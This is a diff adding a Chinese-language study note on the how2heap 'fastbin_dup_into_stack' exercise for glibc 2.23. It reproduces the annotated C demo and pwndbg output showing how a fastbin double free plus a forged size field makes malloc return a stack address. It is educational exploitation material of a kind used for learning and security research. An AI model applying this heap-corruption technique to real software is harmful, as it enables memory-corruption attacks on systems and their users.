@@ -570,4 +570,136 @@ Size: 0x207e0 (with flag bits: 0x207e1)
 
 * **fastbin_dup_consolidate也是一种绕开fastbin double free检查机制的方法。可以将多个指针指向同一块地址，多次利用，并且可以在释放后继续使用**
 
-### fastbin_dup_into_stack
+### 练习：fastbin_dup_into_stack
+这是一个fastbin double free的练习，目标是拿到栈上的一个地址
+先给出how2heap上面的源码
+```c
+// how2heap/glibc_2.23/fastbin_dup_into_stack.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
+	       "returning a pointer to a controlled location (in this case, the stack).\n");
+
+	unsigned long long stack_var;
+
+	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
+
+	fprintf(stderr, "Allocating 3 buffers.\n");
+	int *a = malloc(8);
+	int *b = malloc(8);
+	int *c = malloc(8); // 依旧先malloc三个相同大小的块
+
+	fprintf(stderr, "1st malloc(8): %p\n", a);
+	fprintf(stderr, "2nd malloc(8): %p\n", b);
+	fprintf(stderr, "3rd malloc(8): %p\n", c);
+
+	fprintf(stderr, "Freeing the first one...\n");
+	free(a); // 第一次free(a)
+
+	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
+	// free(a);
+
+	fprintf(stderr, "So, instead, we'll free %p.\n", b);
+	free(b);  // 中间拿其他块隔离一下
+
+	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
+	free(a); // 第二次free(a),现在fastbin上面是head->a->b->a
+
+	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
+		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
+	unsigned long long *d = malloc(8); // 拿到a，现在fastbin上面是head->b->a
+
+	fprintf(stderr, "1st malloc(8): %p\n", d);
+	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8)); // 拿到b，现在fastbin上面是 head->a
+	fprintf(stderr, "Now the free list has [ %p ].\n", a);
+	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
+		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
+		"so that malloc will think there is a free chunk there and agree to\n"
+		"return a pointer to it.\n", a);
+	stack_var = 0x20; // 这里我们想把栈上面stack_var附近伪造成一个假的堆chunk，大小与之前的abc一致。那我们就把size设置为0x20，就放在stack_var地址处
+
+	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
+	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d)); // 那想要拿到这个栈上面的地址，就需要把next指针改了。因为size在stack_var的地址上。而一个正确的chunk的指针应该指向的是size的位置-0x8的位置，这里正好是sizeof(d).
+
+	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8)); // 现在第一次malloc再拿到一次a
+	fprintf(stderr, "4th malloc(8): %p\n", malloc(8)); // 第二次malloc就拿到这个错误的chunk了，分配出来指针应该指向的就是stack_var+8的位置
+}
+
+```
+
+打开gdb我们断点调试一下，发现果真如我们所预料的那样
+1. 在更改d指针指向地址的内容之前，我们下一个断点，看一下原本栈上的内容
+```bash
+───────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────
+In file: /home/lixingjian/pwn/how2heap/glibc_2.23/fastbin_dup_into_stack.c:48
+   39         fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
+   40         fprintf(stderr, "Now the free list has [ %p ].\n", a);
+   41         fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
+   42                 "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
+   43                 "so that malloc will think there is a free chunk there and agree to\n"
+   44                 "return a pointer to it.\n", a);
+   45         stack_var = 0x20;
+   46
+   47         fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
+ ► 48         *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
+   49
+   50         fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
+   51         fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
+   52 }
+───────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffde50 {stack_var} ◂— 0x20 /* ' ' */
+01:0008│-028 0x7fffffffde58 {a} —▸ 0x555555559010 —▸ 0x555555559020 ◂— 0 
+02:0010│-020 0x7fffffffde60 {b} —▸ 0x555555559030 —▸ 0x555555559000 ◂— 0
+03:0018│-018 0x7fffffffde68 {c} —▸ 0x555555559050 ◂— 0
+04:0020│-010 0x7fffffffde70 {d} —▸ 0x555555559010 —▸ 0x555555559020 ◂— 0
+05:0028│-008 0x7fffffffde78 ◂— 0x125a900280047b00
+06:0030│ rbp 0x7fffffffde80 ◂— 0
+07:0038│+008 0x7fffffffde88 —▸ 0x7ffff7820840 (__libc_start_main+240) ◂— mov edi, eax
+```
+**可以看到，a指向b，b指向a，是循环指向的，这是double free里面的一个重要特征，在之前我们的例子里面也有过类似展示。**
+
+2. 我们再在更改玩`*d`之后看一下栈上的地址和内容，看看我们的修改以及伪造堆块操作是否成功
+```bash
+───────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────
+In file: /home/lixingjian/pwn/how2heap/glibc_2.23/fastbin_dup_into_stack.c:50
+   39         fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
+   40         fprintf(stderr, "Now the free list has [ %p ].\n", a);
+   41         fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
+   42                 "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
+   43                 "so that malloc will think there is a free chunk there and agree to\n"
+   44                 "return a pointer to it.\n", a);
+   45         stack_var = 0x20;
+   46
+   47         fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
+   48         *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
+   49
+ ► 50         fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
+   51         fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
+   52 }
+───────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffde50 {stack_var} ◂— 0x20 /* ' ' */
+01:0008│-028 0x7fffffffde58 {a} —▸ 0x555555559010 —▸ 0x7fffffffde48 —▸ 0x55555555548b (main+706) ◂— lea rax, [rbp - 0x30]
+02:0010│-020 0x7fffffffde60 {b} —▸ 0x555555559030 —▸ 0x555555559000 ◂— 0
+03:0018│-018 0x7fffffffde68 {c} —▸ 0x555555559050 ◂— 0
+04:0020│-010 0x7fffffffde70 {d} —▸ 0x555555559010 —▸ 0x7fffffffde48 —▸ 0x55555555548b (main+706) ◂— lea rax, [rbp - 0x30]
+05:0028│-008 0x7fffffffde78 ◂— 0x125a900280047b00
+06:0030│ rbp 0x7fffffffde80 ◂— 0
+07:0038│+008 0x7fffffffde88 —▸ 0x7ffff7820840 (__libc_start_main+240) ◂— mov edi, eax
+─────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
+ ► 0   0x55555555549d main+724
+   1   0x7ffff7820840 __libc_start_main+240
+   2   0x555555555105 _start+37
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/4gx 0x7fffffffde48
+0x7fffffffde48:	0x000055555555548b	0x0000000000000020
+0x7fffffffde58:	0x0000555555559010	0x0000555555559030
+```
+**可以看见，a指向0x7fffffffde48这个地址了，这是一个栈上的地址，仔细看一下stack部分最左侧的地址，发现他就是没展示出来的部分，也就应该是rsp-008的位置**
+**所以我在下面用x/gx语句展示了0x7fffffffde48附近0x20字节的数据，发现0x7fffffffde48这个指针如果指向的是一个0x20大小的chunk，他的size域果真是0x20，他的next指针指向的是a（不过这不重要，因为分配时检查只会检查他的size是否和当前fastbin相同）**
+
+3. 继续执行，直到结束
+**发现`fprintf(stderr, "4th malloc(8): %p\n", malloc(8));`执行的结果是`4th malloc(8): 0x7fffffffde58`,这正好是指向这个伪造块的用户数据段的指针。成功！！！**
+
